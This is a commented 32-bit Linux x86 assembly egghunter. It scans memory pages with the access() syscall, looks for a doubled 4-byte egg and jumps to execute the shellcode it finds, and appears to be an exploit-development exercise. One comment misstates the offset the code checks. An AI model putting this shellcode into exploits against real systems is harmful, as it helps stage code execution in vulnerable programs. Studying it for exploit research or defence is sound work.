global _start

section .text

_start:

    ; Creatation of our egg and clearing registers!
    mov ebx, 0x50905090 ; pointing ebx to our egg 
    xor ecx, ecx ; ecx = 0
    mul ecx      ; eax = 0, edx = 0

    page_forward: ; Here we're creating a function telling the computer what to do if we get an EFAULT error
    or dx, 0xfff  ; Here we're doing a bitwise logical OR against the edx value

    address_checking: ; Here we're designing a function to check the next 8 bytes of memory   
    inc edx           ; gets edx to a nice multiple of 4096
    pushad            ; This will preserve our register values by pushing them onto the stack while we syscall
    lea ebx, [edx+4]  ; putting edx plus 8 to check if this fresh page is readable by us
    mov al, 0x21      ; syscall for access(), sounds familar?
    int 0x80

    cmp al, 0xf2      ; Asking the question if the low-end of eax equal 0xf2? Meaning, did we get an EFAULT error?
    popad             ; restore our register values we placed on the stack
    jz page_forward   ; if we got an EFAULT, this page is trash, and we need to move on to the next page

    cmp [edx], ebx    ; Is the value stored in edx our egg (value at ebx)?
    jnz address_checking ;if it's not, let's search further and see if we can't find our egg

    cmp [edx+4], ebx  ; we found our egg once, let's see if it's also in edx+4
    jnz address_checking ; we found it once, Let's do it again to double check

    jmp edx           ; We found it twice! Let's go to edx (where our egg is) and execute our shellcode!

